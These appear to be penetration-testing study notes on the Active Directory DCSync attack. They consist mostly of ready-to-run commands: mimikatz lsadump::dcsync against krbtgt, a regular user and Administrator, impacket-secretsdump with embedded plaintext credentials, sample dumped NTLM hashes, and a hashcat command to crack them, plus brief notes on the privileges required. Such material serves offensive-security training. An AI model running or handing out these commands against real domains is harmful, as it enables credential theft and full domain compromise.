## DCSync
```
lsadump::dcsync /user:krbtgt
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

DC SYNC
PS C:\Tools> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:corp\dave    
Mimikatz performed the dcsync attack by impersonating a domain controller and obtained the user credentials of dave by using replication

kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
mimikatz # lsadump::dcsync /user:corp\Administrator

Linux DCSYNC hash attack 
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Password123"@192.168.50.x
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mute:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::

We need a user that is a member of Domain Admins, Enterprise Admins, or Administrators,
The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. 
By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. 
However, to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. 
Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
```
